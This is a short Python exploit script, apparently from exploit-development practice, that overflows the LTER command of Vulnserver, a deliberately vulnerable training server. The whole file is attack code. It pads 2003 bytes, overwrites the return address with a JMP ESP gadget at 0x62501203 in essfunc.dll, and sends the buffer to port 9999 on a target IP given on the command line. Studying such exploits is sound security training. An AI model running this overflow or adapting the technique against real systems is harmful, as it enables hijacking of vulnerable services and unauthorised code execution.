#########################################################################################
# Title: Vulnserver LTER command exploit
# Author: Marco Lugo
# Description: find reliable way to jump to the stack.
#              A (bad-character-compliant) JMP ESP instruction is found in essfunc.dll at 0x62501203
#
#              To get Stephen Bradshaw's Vulnserver, visit:
#              http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
#########################################################################################

import socket
import sys
import os
import struct

jmp_esp = struct.pack('<I', 0x62501203)

target_ip = sys.argv[1]
buffer = 'LTER /.:/' 
pattern = '\x41'*2003 + jmp_esp + '\x43'*(3503-2003-4)
buffer += pattern

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, 9999))
sock.recv(1024)
sock.send(buffer)
sock.close()
